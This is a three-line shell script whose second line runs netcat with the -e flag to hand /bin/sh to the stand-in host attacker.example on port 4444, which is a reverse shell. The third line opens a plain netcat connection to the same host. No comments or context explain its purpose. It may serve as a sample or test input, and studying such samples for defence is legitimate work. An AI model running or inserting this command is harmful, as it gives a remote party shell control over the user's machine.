#!/bin/sh
netcat -e /bin/sh attacker.example 4444
netcat attacker.example 4444
